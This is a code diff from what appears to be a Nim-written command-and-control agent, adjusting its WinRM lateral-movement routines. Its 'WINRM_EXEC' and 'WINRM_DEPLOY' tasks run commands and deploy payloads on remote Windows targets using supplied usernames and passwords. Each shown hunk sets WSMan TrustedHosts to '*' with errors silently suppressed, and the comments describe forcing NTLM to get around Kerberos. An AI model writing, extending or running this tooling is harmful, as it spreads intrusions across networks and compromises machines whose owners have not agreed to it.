@@ -1853,7 +1853,9 @@ when defined(windows):
       # set TrustedHosts=*, and pass -Authentication NTLM to bypass Kerberos/Negotiate.
       # 0x8009030d (SEC_E_NO_CREDENTIALS) occurs when Negotiate tries Kerberos for a
       # local account on a domain-joined machine — NTLM auth resolves this.
-      let addTrust = "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;" &
+      let addTrust = "$ep=$ErrorActionPreference;$ErrorActionPreference='SilentlyContinue';" &
+                     "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force;" &
+                     "$ErrorActionPreference=$ep;" &
                      "try{$ip=([System.Net.Dns]::GetHostAddresses('" & host & "')|" &
                      "Where-Object{$_.AddressFamily -ne 23}|Select-Object -First 1).IPAddressToString}" &
                      "catch{$ip='" & host & "'};"
@@ -3632,7 +3634,9 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
         let cmd3    = j{"cmd"}.getStr()
         if target2 == "" or cmd3 == "":
           t.sendResult(id, "", "WINRM_EXEC: {\"target\",\"user\",\"pass\",\"cmd\"} required"); return
-        let addTrust2 = "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;" &
+        let addTrust2 = "$ep=$ErrorActionPreference;$ErrorActionPreference='SilentlyContinue';" &
+          "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force;" &
+          "$ErrorActionPreference=$ep;" &
           "try{$ip=([System.Net.Dns]::GetHostAddresses('" & target2 &
           "')|Where-Object{$_.AddressFamily -ne 23}|Select-Object -First 1).IPAddressToString}" &
           "catch{$ip='" & target2 & "'};"
@@ -3656,7 +3660,9 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
         let payload2 = j{"payload"}.getStr()
         if target3 == "" or payload2 == "":
           t.sendResult(id, "", "WINRM_DEPLOY: {\"target\",\"user\",\"pass\",\"payload\"} required"); return
-        let addTrust3 = "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;" &
+        let addTrust3 = "$ep=$ErrorActionPreference;$ErrorActionPreference='SilentlyContinue';" &
+          "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force;" &
+          "$ErrorActionPreference=$ep;" &
           "try{$ip=([System.Net.Dns]::GetHostAddresses('" & target3 &
           "')|Where-Object{$_.AddressFamily -ne 23}|Select-Object -First 1).IPAddressToString}" &
           "catch{$ip='" & target3 & "'};"
